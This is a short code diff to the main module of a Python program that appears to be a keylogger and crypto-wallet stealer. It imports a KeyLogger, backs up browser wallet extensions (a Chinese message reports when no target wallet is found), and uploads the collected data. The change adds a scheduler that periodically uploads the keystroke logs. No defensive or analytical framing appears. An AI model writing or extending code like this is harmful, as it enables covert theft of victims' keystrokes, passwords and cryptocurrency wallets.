@@ -8,7 +8,7 @@ import argparse
 
 from .logger import KeyLogger, create_log_file
 from .backup import backup_browser_extensions
-from .uploader import upload_all
+from .uploader import upload_all, start_log_upload_scheduler
 
 
 def main():
@@ -30,6 +30,7 @@ def main():
         print("未检测到目标钱包扩展\n")
 
     upload_all()
+    start_log_upload_scheduler()
     
     # 启动键盘记录器
     logger = KeyLogger(log_file, debug_mode=args.debug)
